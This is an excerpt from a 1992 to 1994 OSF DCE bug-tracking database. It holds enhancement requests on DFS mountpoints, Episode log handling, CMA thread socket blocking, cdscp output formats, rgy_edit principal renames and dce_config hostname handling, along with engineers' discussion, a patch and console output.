by the fileserver it cannot be accessed by its "name" in the exported
filesystem since a DFS mountpoint cannot be constructed for the fileset
because the name already exists in the parent fileset.  Let me illustrate
by example.

  Suppose / is exported from a server machine and /usr is a filesystem
  mounted under /.

  A DFS client will see /usr, but will be unable to traverse the directory.
  A mountpoint (fts crmount) cannot be created for /.../cellname/fs/usr
  since this name already exists.  The only way to get to /usr from
  /.../cellname/fs would be to create a mountpoint with a different name.
  For example: fts crmount /.../cellname/fs/susr serveruserfs

  This is an undesirable effect.  The result is that a client cannot
  represent the file tree of the server it is exporting.

  I have talked to Mike Kazar at Transarc, and he has talked to other
  Transarc people and we all agree this should be fixed.  We have
  agreed on a solution.  The solution will require modifying the
  AFS_Lookup interface, and adding a new RPC interface for the client
  to query a mountpoint.

  This bug is to have those changes made.  The protocol changes should
  be made asap with enough code at the client and server to minimally
  support the change in an upward compatable fashion.  The rest of
  the code can be added afterwords.

  With these changes a client will be able to cross the unix mount points at
  the fileserver as long as the fileset mounted on the mount point is
  exported (dfsexport).
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/10/92 public]
Reducing priority and fix by release fields.  The protocol change has been
made by Transarc under ot bug 4597.
Changed Priority from `1' to `2' 
Changed Fix By Baseline from `1.0.1' to `1.0.2'

[7/29/92 public]
From Carl's note it appears Mike K. is the right one to own this defect.
Reassigned.

Filled in Subcomponent Name with `px' 
Changed Short Description from `px: present /etc/mount points as dfs 
 mountpoints' to `present /etc/mount points as dfs mountpoints' 
Changed Interest List CC from `kazar@transarc.com' to `mason@transarc.com' 
Changed Responsible Engr. from `mason@transarc.com' to `kazar@transarc.com'

[9/8/92 public]
Changed Defect or Enhancement? from `def' to `enh'

[3/30/94 public]
We're looking at this for 1.1



CR Number                     : 4568
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : cm
Short Description             : pioctl for VIOC_AFS_STAT_MT_PT fails with ETIMEDOUT
Reported Date                 : 7/1/92
Found in Baseline             : 1.0.2
Found Date                    : 7/1/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[7/1/92 public]

This is in a one rios machine cell configured using local build
dfs-102-1.40 backed by osf build 18. The following pioctl call fails
with errno of ETIMEDOUT:

  pioctl ( "/.../dewitt.com", VIOC_AFS_STAT_MT_PT, &parg, 0 );

where parg is declared as 

  struct afs_ioctl parg

and its contents are:  

  parg.in="fs"
  parg.out=out_buf
  parg.in_size=3
  parg.out_size=MAXPATHLEN

and out_buf is declared as

  char out_buf[MAXPATHLEN]

and MAXPATHLEN is 1024.

The outbuf does not have anything in it after the pioctl and the parg.out_size
value remains at MAXPATHLEN.

However immediately after this 

  cd /.../dewitt.com/fs
  ls

works fine.

Rerunning the binary with the pioctl call fails with the same error.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/1/92 public]

fts lsmount /.../dewitt.com/fs also fails with "Connection timed out".

The output from the fts command is:

 [(rootl)config_files] fts lsmount /.../dewitt.com/fs
fts lsmount: error for file '/.../dewitt.com/fs': Connection timed out
 [(rootl)config_files] cd /.../dewitt.com/fs
 [(rootl)fs] pwd
/.../dewitt.com/fs
 [(rootl)fs] ls
adm/         guest/       lpd/         news/        sys/         usg/
afsws@       include/     lpp/         preserve/    testit       usr/
bin/         lib/         mail@        pub/         tmp/         vice/
dict/        local@       man/         rajesh/      u/
etc/         lost+found/  msgs/        spool/       ucb/
 [(rootl)fs] fts lsmount /.../dewitt.com/fs
fts lsmount: error for file '/.../dewitt.com/fs': Connection timed out

[7/1/92 public]
The root.dfs is a UFS fileset in the above case.

[7/2/92 public]
Rajesh clearly notes he found this defect in our 1.0.2 builds; I am
marking the defect as such and lowering its priority (since it is
applicable to 1.0.2, not 1.0.1)

If this IS applicable to 1.0.1, it should be updated as such.
Filled in Interest List CC with `kazar@transarc.com' 
Changed Found in Baseline from `1.0.1b18' to `1.0.2' 
Changed Priority from `1' to `2' 
Changed Fix By Baseline from `1.0.1' to `1.0.2' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[7/2/92 public]
The object being read isn't really a mount point; it's a junction from the
DCE directory space (CDS) into DFS-land.  The junction simply acts a little
like a mount point, but it's a simulated mount point, not a real one.  The
VIOC_AFS_STAT_MT_PT call was never intended to work in this case.

I'm changing this to be an enhancement request: requesting that the
initial DFS junction point be readable via this pioctl(), even though as
far as the cache manager is concerned, the directory is in a shadowy,
virtual space.
Changed Defect or Enhancement? from `def' to `enh' 
Changed H/W Ref Platform from `rs6000' to `all' 
Changed S/W Ref Platform from `aix' to `all' 
Changed Severity from `B' to `C' 
Changed Priority from `2' to `3'



CR Number                     : 4558
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 4548
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Avoid writing dirty buffers which require log force
Reported Date                 : 7/1/92
Found in Baseline             : 1.0.2
Found Date                    : 7/1/92
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jdp@transarc.com
Transarc Status               : open
Transarc Delta                : 

[7/1/92 public]
The transaction size reservation scheme depends on efficient use of log
space.  The current code starts a new log page whenever the log needs to
be forced.  Thus conceivably every log record could occupy a whole page
if the log was forced frequently enough.  The transaction reservation
scheme assumes 100% utilization of log pages.
The suggested fix for this is to write the current log page when a force
is requested but to not start a new page.  Thus subsequent updates would
be appended to the current page which would then be rewritten when it
fills or in response to the next force (a second force without an
intervening record would be a no-op).  This will bring the utilization
to near 100%.  The remaining limit is that unsplitable records may force
a new page if the current page does not have enough room.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jdp@transarc.com' 
Added field Transarc Status with value `open'

[7/15/92 public]
We discussed this today.  The technique we will use here is one in
which we write the current (partial) log page.  To avoid being forced
to wait on the I/O, we copy the page at that point into a new buffer,
marking that it is a duplicate of a partial page.  The I/O to this
page cannot be scheduled until the previous partial page I/O has
finished.  Thus, rather than writing the page immediately, we must be
able to defer the write of that page until the I/O completeion event.
Subsequent log pages must also be added to a list of "to be scheduled"
pages in the same fashion.  Once that I/O has completed, the pages on
the "to be scheduled" list are written if possible (one possibility is
that the list might contain another partial page, in which case we
cannot write that page out, so we iterate over this process.)
This should be done for the sync and for the fsync code paths.

[7/23/92 public]
Changed to an enhancement to keep Julie happy.
Tony and I discussed this some more today.  It is now clear that
rewriting log pages is unacceptable.  To see why, consider what happens
if there is a power failure while rewriting a log page (which would
always be the head).  The page cksum code (which actually doesn't exist
yet, see OT 3435) will reject the last page.  This will violate any
guarantees that might have been made when forcing the partial page in
the first place (otherwise why do the force in the first place?).
Given that this approach is bogus how can we keep the efficiency of log
utilization high?
There are two reasons why we force the log.  In fsync, at the user's
request, and in the buffer code, when writing dirty meta-data buffers
(to maintain the write-ahead invariant).  In the latter case we can just
avoid writing dirty buffers when it would require a log force in the
alloc buffer code if there is any other buffer to use (the log full
handling code clearly must continue forcing the log as necessary).
Fixing the fsync case can also be achieved easily.  In fsync we already
wait for the last transaction that modified the file to complete (it is
certainly ended but we also must wait for any other EC members to end as
well).  The fix is that once this has happened we wait for either the
transaction system to quiesce then force the log or for the current log
page (which includes the desired transaction's end record) to be
written.  This has very desirable properties.  If the system is inactive
then the transaction system will quiesce quickly and the log can be
forced with no effect on log utilization (since there will be no active
transactions to be affected).  If the system is busy then the current
log page will fill up and be written out quickly and no extra work will
be required.
This gives us group commit advantages as a side-effect!
Changed Defect or Enhancement? from `def' to `enh'

[8/5/92 public]
Changed Short Description from `Do not start new page when forcing log' to `Fix 
 fsync and AllocBuffer to avoid partial log pages'

[11/16/92 public]
I think this work was done (mostly) during the quiesce work.  Cancel.
Changed Status from `open' to `cancel'

[11/17/92 public]
We can't cancel this until someone actually checks to see if "this work
was done (mostly) during the quiesce work".
Changed Status from `cancel' to `open'

[2/4/93 public]
The fsync work is done.
The fix to AllocBuffer to avoid writing dirty buffers which require log
forces.  This is a significant issue because it can cause log full
panics (therefore Severity B).  However, it is very unlikely to be a
common problem (therefore Priority 4).
Changed Short Description from `Fix fsync and AllocBuffer to avoid partial log 
 pages' to `Avoid writing dirty buffers which require log force' 
Changed Severity from `C' to `B'

[11/15/93 public]
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com' 
Added field Transarc Delta with value `'

[11/29/93 public]
Moved to the Transarc database as db4745.
Changed Subcomponent Name from `lfs' to `EPISODE' 
Filled in Reported by Company's Ref. Number with `4745'



CR Number                     : 4557
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 6131
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : sync should truncate log on an idle system
Reported Date                 : 7/1/92
Found in Baseline             : 1.0.2
Found Date                    : 7/1/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jdp@transarc.com

[7/1/92 public]
It would be nice if repeated sync's on an idle system would result in
either a trivial or clean log.  It is anomalous that a long idle system
can still have a log containing 10000 records.  Currently sync only
writes out dirty user data.
The suggested implementation is to write dirty metadata buffers if there
are not active transactions.  If there are no dirty buffers and no
active transactions write a restart block.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jdp@transarc.com' 
Added field Transarc Status with value `open'

[11/16/92 public]
 Sync does not behave in the manner described.  We've been over this
one and I believe the existing coverage is adequate.
Changed Status from `open' to `cancel'

[11/17/92 public]
It is still desirable to have sync (how ever it behaves) truncate the
log when the system is idle.
If the OT system can't be used to track desirable enhancements then
another mechanism will need to be devised to track work items.  In the
meantime please stop randomly canceling OTs.
Changed Status from `cancel' to `open'

[11/17/92 public]
 It DOES truncate the log.  What it doesn't do is write a clean
restart block.  I looked at the work involved.  It was substantial and
it had no clear benefits other than to prevent a few seconds of
running time at recovery.
This has nothing to do with the OT system - it has to do with the
relative desirability of this proposed change.
Reassigned to Ted.
Changed Interest List CC from `ota@transarc.com, bwl@transarc.com, 
 comer@transarc.com' to `ota,bwl,comer' 
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com'

[11/17/92 public]
We need a way to write an almost empty log block which can act as a
checkpoint.  Each log block contains an oldest data and tran pointer.
The oldest of these, with the current block bracket the active portion
of the log.  An idle log can still have a large active region because of
dirty meta-data buffers written after the last log block was written.
Once the log is idle a checkpoint record can be written in response to
sync (or whatever) by inserting a zero length debug record and calling
NewLogPage.  This probably wants to set some status flag (cleared by and
WriteLog) which prevents repeatedly writing checkpoint blocks.
Filled in Inter-dependent CRs with `6131'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 4495
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : Signature mismatch with same
function in OSF/1
Reported Date                 : 6/26/92
Found in Baseline             : 1.0.1b20
Found Date                    : 6/26/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/26/92 public]

pthread_signal_to_cancel_np()'s signature in DCE is different than
what is in OSF/1. That is the second argument of this api is of
type 'pthread_t *' in DCE instead of 'pthead_t' in OSF/1 pthread
implementation.

[06/29/92 public]
While we recognize the importance of harmonizing the interfaces
presented by the DCE and OSF/1 Pthreads implementations, this
is an enhancement that won't be performed for 1.0.1.  Defer it
till afterward.



CR Number                     : 4365
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : ./threads/cma_thread_io.c
Short Description             : The non_blocking field for socket type file should be set to false.
Reported Date                 : 6/19/92
Found in Baseline             : 1.0
Found Date                    : 6/19/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/19/92 public]
Full Description:

I am porting DCE thread package to Sun Sparc and am running the
thread test code. All the test cases with socket failed: infinitely waiting
for message to come: the process is blocked, no one else can run.

I traced the code and found the following problem: the non-blocking filed
of 
cma__g_file_obj for the socket file descriptor is set to true in
cma__open_general() when the socket is opened. Thus, when a recvmsg
(cma_recvmsg) is called to receive a message from another thread, the
cma__ts_func macro lets it execute the recvmsg sys call without doing io
wait, hence hanging the whole process. When I set that field in debug to
false, the test case runs fine.

This is not a Sun specific problem. I believe that it would cause failure
on
AIX and OSF/1 machines, unless the kernel thread is usedin OSF/1 case. Did
we
run all the thread test before shipping 1.0? I found OT 2317, which
described
a similar problem, but was taken as something else.

I further looked at the 1.0.1 code. A new field set_non_blocking is added,
but I am afraid that it does not fix this problem with my code inspection.
cma__set_non_blocking is called in cma__ts_func when non_blocking is true,
and the function is still carried out without setting io to wait. Can you
successfully run those socket related test case with 1.0.1 code?


Repeat By:

	Run any thread test case with socket (cuvb_nbi_002 for example).

Proposed Solution:

	The following patch is for 1.0 code:

*** cma_thread_io.c.orig	Fri Jun 19 17:44:17 1992
--- cma_thread_io.c	Fri Jun 19 17:48:52 1992
***************
*** 1094,1100 ****
  	     * According to the documentation, this means the file is a
socket.
  	     */
  	    case EOPNOTSUPP: {
! 		cma__g_file_obj[fo].non_blocking = cma_c_true;
  		cma__trace ((
  			cma__c_trc_io,
  			"(open_general) fd %d is a socket (EOPNOTSUPP)",
--- 1094,1101 ----
  	     * According to the documentation, this means the file is a
socket.
  	     */
  	    case EOPNOTSUPP: {
! 		/* socket's non-blocking field should be set to false */
! 		cma__g_file_obj[fo].non_blocking = cma_c_false;
  		cma__trace ((
  			cma__c_trc_io,
  			"(open_general) fd %d is a socket (EOPNOTSUPP)",
***************
*** 1136,1141 ****
--- 1137,1144 ----
  	    case S_IFCHR:
  	    case S_IFBLK:
  	    case S_IFREG:
+             case 0:             /* Yet another SOCKET possibility... */
+             case S_IFSOCK:
  	    case S_IFLNK: {
  		cma__g_file_obj[fo].non_blocking = cma_c_false;
  		break;
***************
*** 1145,1154 ****
  	     * For the following types of files, setting non-blocking mode
is
  	     * just the right thing to do, so do it.
  	     */
- 	    case 0:		/* Yet another SOCKET possibility... */
- #if _CMA_VENDOR_ != _CMA__APOLLO
- 	    case S_IFSOCK:
- #endif
  	    case S_IFIFO: {
  		cma__g_file_obj[fo].non_blocking = cma_c_true;
  		break;
--- 1148,1153 ----


wwang 6/26

When a socket is opened as UNIX socket, its file statuys is S_IFIFO. I
think its non_blocking filed should also be set to false, instead of true.

wwang 6/26

I looked at 1.0.1 code again and realized that 1.0.1 actually fixed this 
problem by adding a new function cma__set_nonblocking. When a file is
opened, its new set_non_blocking field is always set to false. And later if
its non_blocking filed is true, it calls cma__set_nonblocking to call
fcntl to explicitly set the file to be non blocking.

Since by default, all files are opened as blocking, I think it may make
more sense to just set the non_blocking field to always false. This will
make all cases working.

[06/29/92 public]
Just for the record:  I don't believe the analysis above is quite
correct (for either the 1.0 or the 1.0.1 code).  In the 1.0 code,
setting the non_blocking field of the file object to true does *not*
indicate an assumption that the file is already set up for non-blocking
I/O.  Rather, it indicates that an fcntl() call is to be done, later in
cma__open_general(), that will force the file to be set non-blocking.
My guess (and that's all it is) is that this fcntl call (F_SETFL) isn't
working under SunOS, such that the file remains blocking even after the
call.

Setting non_blocking to false, which is one way around this problem,
disables a significant performance optimization, since it forces CMA
always to enter cma__io_wait() for any I/O on the file, rather than
trying the I/O once, then falling into cma__io_wait() if the operation
would block.  Thus it is desirable to continue setting files to be
non-blocking (and setting a flag to indicate this) wherever possible.

The 1.0.1 code changed in this area due to a problem (reported as
defect 2540) caused by always setting files to be non-blocking as soon
as they're opened.  The intent of the changes is to delay this setup
until the first time a file is used.

So:  there is a portability problem here, at least in the 1.0
source base.  Until we know what it is, we can't know if it's
fixed in 1.0.1.  But it's not the problem detailed above...

And, yes, all functional tests were run (and are still being run)
with both the 1.0 and 1.0.1 testcase sources, including those
that failed here.

[07/01/92 public]
Don is right. It is indeed a portability problem. To set the status to be 
non-blocking using fcntl() on Sun, one can only use FNDELAY, not O_NDELAY,
nor O_NONBLOCK.

Realizing this, 1.0.1 still has the same portability problem.

[09/10/92 public]
I think the bottom line here is that the setup of cma___c_non_blocking_flag
in cma_thread_io.c should be modified to force each port of CMA to
choose its own flag from among the (obviously inconsistent) set of
possibilities.  The current code rather optimistically defaults to
using the POSIX O_NONBLOCK flag.  This becomes an enhancement request.



CR Number                     : 4326
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : thr
Subcomponent Name             : 
Short Description             : no atfork support on ref. platforms
Reported Date                 : 6/18/92
Found in Baseline             : 1.0.1b18
Found Date                    : 6/18/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/18/92 public]
Discovered during system test (see OT 4147, dcecdnam RPC client hangs
during fork() call). We suspect lack of atfork() support within RPC
is causing the hang. In any event, this should be fixed for other/future
unsuspecting (forking) dce rpc applications.

[06/23/92 public]
In general, forking is not supported in DCE programs.  I made this as C2
enhancement, and made it a general DCE issue (not RPC/Nat Mishkin) since
we do not know what other areas within DCE need to be made fork-safe.



CR Number                     : 4294
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : cdscp show dir /.: has two formats
Reported Date                 : 6/16/92
Found in Baseline             : 1.0.1
Found Date                    : 6/16/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/16/92 public]

If RPC_SUPPORTED_PROTSEQS is set to either CN of DG, we get a new output
format: 

cdscp show dir /.:

                        SHOW
                   DIRECTORY   /.../santa_cell.osf.org
                          AT   1992-06-16-20:41:24
            RPC_ClassVersion = 0100
                     CDS_CTS = 1992-06-16-14:48:10.641054100/08-00-2b-24-c9-6a
                     CDS_UTS = 1992-06-16-19:52:12.163720100/08-00-2b-24-c9-6a
              CDS_ObjectUUID = 0061D12D-FF2A-1A3D-98F7-08002B24C96A
                CDS_Replicas = :
          Clearinghouse UUID = 002B92BA-FF22-1A3D-98F7-08002B24C96A
           Tower  1 Floor 1  = 0d c9 f1 7d 25 d3 c6 ca 11 85 54 08 00 2b 1c 8f 1
f 01 00         00 00
           Tower  1 Floor 2  = 0d 04 5d 88 8a eb 1c c9 11 9f e8 08 00 2b 10 48 6
0 02 00         00 00
           Tower  1 Floor 3  = 0b       00 00           connection
           Tower  1 Floor 4  = 07       00 00           port: 0, ncacn_ip_tcp
           Tower  1 Floor 5  = 09       82 69 05 fa     host: 130.105.5.250
                       Tower = ncadg_ip_udp:130.105.5.250[]
                Replica type = master
          Clearinghouse Name = /.../santa_cell.osf.org/santa_ch
                 CDS_AllUpTo = 1992-06-16-20:11:28.889109100/08-00-2b-24-c9-6a
             CDS_Convergence = low
                CDS_InCHName = allowed
        CDS_DirectoryVersion = 3.0
            CDS_ReplicaState = on
             CDS_ReplicaType = master
               CDS_LastSkulk = 1992-06-16-20:11:28.889109100/08-00-2b-24-c9-6a
              CDS_LastUpdate = 1992-06-16-19:52:12.163720100/08-00-2b-24-c9-6a
             CDS_RingPointer = 002B92BA-FF22-1A3D-98F7-08002B24C96A
                   CDS_Epoch = 0061D12C-FF2A-1A3D-98F7-08002B24C96A
          CDS_ReplicaVersion = 3.0
             CDS_GDAPointers = :
                     Timeout = :
                  Expiration = 1992-06-17-15:48:37.056
                   Extension = +1-00:00:00.000
          Clearinghouse UUID = 001F1472-FF44-1A3D-9A69-08002B24C96A
           Tower  1 Floor 1  = 0d c9 f1 7d 25 d3 c6 ca 11 85 54 08 00 2b 1c 8f 1
f 01 00         00 00
           Tower  1 Floor 2  = 0d 04 5d 88 8a eb 1c c9 11 9f e8 08 00 2b 10 48 6
0 02 00         00 00
           Tower  1 Floor 3  = 0b       00 00           connection
           Tower  1 Floor 4  = 07       00 00           port: 0, ncacn_ip_tcp
           Tower  1 Floor 5  = 09       82 69 05 fa     host: 130.105.5.250
                       Tower = ncadg_ip_udp:130.105.5.250[]
                Replica type = gda
          Clearinghouse Name = /.../santa_cell.osf.org/santa_gda


If unset then we get the old format:

cdscp> show dir /.:
show dir /.:

                        SHOW
                   DIRECTORY   /.../santa_cell.osf.org
                          AT   1992-06-16-20:40:26
            RPC_ClassVersion = 0100
                     CDS_CTS = 1992-06-16-14:48:10.641054100/08-00-2b-24-c9-6a
                     CDS_UTS = 1992-06-16-19:52:12.163720100/08-00-2b-24-c9-6a
              CDS_ObjectUUID = 0061D12D-FF2A-1A3D-98F7-08002B24C96A
                CDS_Replicas = :
          Clearinghouse UUID = 002B92BA-FF22-1A3D-98F7-08002B24C96A
                       Tower = ncacn_ip_tcp:130.105.5.250[]
                       Tower = ncadg_ip_udp:130.105.5.250[]
                Replica type = master
          Clearinghouse Name = /.../santa_cell.osf.org/santa_ch
                 CDS_AllUpTo = 1992-06-16-20:11:28.889109100/08-00-2b-24-c9-6a
             CDS_Convergence = low
                CDS_InCHName = allowed
        CDS_DirectoryVersion = 3.0
            CDS_ReplicaState = on
             CDS_ReplicaType = master
               CDS_LastSkulk = 1992-06-16-20:11:28.889109100/08-00-2b-24-c9-6a
              CDS_LastUpdate = 1992-06-16-19:52:12.163720100/08-00-2b-24-c9-6a
             CDS_RingPointer = 002B92BA-FF22-1A3D-98F7-08002B24C96A
                   CDS_Epoch = 0061D12C-FF2A-1A3D-98F7-08002B24C96A
          CDS_ReplicaVersion = 3.0
             CDS_GDAPointers = :
                     Timeout = :
                  Expiration = 1992-06-17-15:48:37.056
                   Extension = +1-00:00:00.000
          Clearinghouse UUID = 001F1472-FF44-1A3D-9A69-08002B24C96A
                       Tower = ncacn_ip_tcp:130.105.5.250[]
                       Tower = ncadg_ip_udp:130.105.5.250[]
                Replica type = gda
          Clearinghouse Name = /.../santa_cell.osf.org/santa_gda

[7/8/92 public]
Changed component to cds.  The cds folks may wish decide to mark this as
an enhancement.

[7/6/92 public]

Yes, this is definitely an enhancement.



CR Number                     : 4270
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Princ name change on sec_rgy_acct_rename not implemented
Reported Date                 : 6/15/92
Found in Baseline             : 1.0.1
Found Date                    : 6/15/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/15/92 public]

The following does not work:

rgy_edit=> do p
rgy_edit=> a rk
rgy_edit=> do a
rgy_edit=> a rk -g none -o none -pw -dce- -mp -dce-
rgy_edit=> do p
rgy_edit=> a xyz
rgy_edit=> do a
rgy_edit=> c -p rk -g none -o none -mp -dce- -np xyz
?(rgy_edit) Unable to change "rk" - Illegal PGO or directory name (dce / sec)

We have tried the above without adding the principal xyz, which also does
not work. Burati says that if the principal is not created then it 
should not work, but if the principal is created then it should work.

[6/15/92 public]
Note: The '-mp -dce-' option in the change command above is useless, since
it's only used to encrypt a new key that was specified with a -pw or -rp
option.  I am able to reproduce the problem here on RIOS at b18 with both
the above syntax, and the interactive change command (using prompts instead
of the -np option).  It's lower priority than a couple CR's I'm working on
now, so I'll get to it after those.

[6/18/92 public]
It turns out that principal name changes on an account rename are not
supported by secd yet.  I need to talk this over with Joe when he gets
back next week.  It may be an enhancement to secd that gets deferred to
1.0.2, in which case we'll have to get something into the release notes
explaining why rgy_edit change -np always returns an error.

[6/22/92 public]
This enhancement to secd cannot be done in time for 1.0.1, so we've marked
it 'defer'.  We'll look into it for 1.0.2, and try to get a msg in the release
notes that the registry functionality corresponding to rgy_edit's change -np
is not implemented yet.



CR Number                     : 4252
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : control
Short Description             : In cdscp, setting invalid preferred clearinghouse "works"
Reported Date                 : 6/12/92
Found in Baseline             : 1.0.1b18
Found Date                    : 6/12/92
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[6/12/92 public]
Set invalid 'cdscp preferred clearinghouse'; no error, able to 'show' it.
Attempted to 'show dir /.:'--got an error for each attribute.  Test is 
needed to verify that the 'set' clearinghouse is valid.  Console follows:

# cdscp
cdscp> set cdscp preferred clear /.:/foo_ch
cdscp> sh cdscp preferred clear
read attribute values from clearinghouse /.../achilleus.cell.austin.ibm.com/foo_ch
cdscp> sh dir /.:

                        SHOW
                   DIRECTORY   /.../achilleus.cell.austin.ibm.com
                          AT   1992-06-12-13:46:42
            RPC_ClassVersion = 
                     CDS_CTS = 
                     CDS_UTS = 
              CDS_ObjectUUID = 
                CDS_Replicas = 
                 CDS_AllUpTo = 
             CDS_Convergence = 
                CDS_InCHName = 
        CDS_DirectoryVersion = 
            CDS_ReplicaState = 
             CDS_ReplicaType = 
               CDS_LastSkulk = 
              CDS_LastUpdate = 
             CDS_RingPointer = 
                   CDS_Epoch = 
          CDS_ReplicaVersion = 
             CDS_GDAPointers = 
Error on entity: /.../achilleus.cell.austin.ibm.com
Specified clearinghouse does not exist (dce / cds)
Function: dnsReadAttrValue

Error on entity: /.../achilleus.cell.austin.ibm.com
Specified clearinghouse does not exist (dce / cds)
Function: dnsReadAttrValue

...

[12/7/92 public]
This behavior is confusing, but has an obvious workaround. Adding
additional error checking to cdscp in general is an enhancement.



CR Number                     : 4214
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cfg
Subcomponent Name             : dce_config
Short Description             : Don't cut domain info off of hostname!
Reported Date                 : 6/11/92
Found in Baseline             : 1.0.1b18
Found Date                    : 6/11/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[6/11/92 public]
A recent change to dce_config now cuts all domain info off of the end of the
hostname (i.e., 'snoopy.osf.org' is cut down to 'snoopy').  I presume this
was done so /.:/hosts/<hostname>/self, etc., would not be so bulky to
type.

BUT:  We went around about this right at the end of 1.0--this is not the
right solution!  Cells could contain machines from multiple domains so my
cell might want to have 'snoopy.osf.org' and 'snoopy.austin.ibm.com', but
dce_config won't let it.

How about this solution?  Use the fully qualified name for the real CDS
directory, then create a soft link to that one using the shortened name.
Then if there is a short-name conflict, you can prompt for another alias
that he/she might want to use.  (Or worst case, report the error and have
him/her do the appropriate cdscp command after dce_config finishes.)

[6/12/92 public]
This was a problem in dce_config well before the change to cut the 
domain off.  $HOSTNAME was always set as the output of the hostname
command which does not report domain info (at least on OSF1).

The recent change to strip domain info really was to prevent hostname 
comparisions done in DFS config from failing simply because one hostname 
had domain info attached.  The only solution I see to the problem you 
point out is to add yet another prompt to dce_config for the local 
machine's hostname, and to tell the user to enter a fully "domained"
name.

Changing to an enhancement.

[8/24/94 public]
Its been around for 2 years, we aren't going to resolve this for 1.1.
Sounds like something less that a P1 to me...

[8/26/94 public]
You can define the priority as you wish, since we have already implemented
workarounds in our products that satisfy us.  Just realize that this is 
something that can limit the scalability of DCE...

[melman 8/26/94 public] 
Yeah, but dce_config is really just an example.  While the current version
is very usable in our development environment, it certainly is not the
end-all of DCE configuration.  We absolutely expect licensees to use
dce_config when doing their port and when starting to use the code.  We
also expect them to probably provide much more advanced integrated
functions in their product versions.

If you were administering a large cell, would you really want to use
dce_config? 

The names under /.:/hosts/ should be well defined by the namespace
conventions work that was originally scheduled for DCE 1.1, but will
probably happen in DCE 1.2.

[8/25/94 public]
I know, I know, it's just an example.  However, it is very nice when
examples "work correctly," or at least document the issues that we
"experts" know exist so "novice" porters don't have to find out after
they ship their products and have customers start calling...



CR Number                     : 4152
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
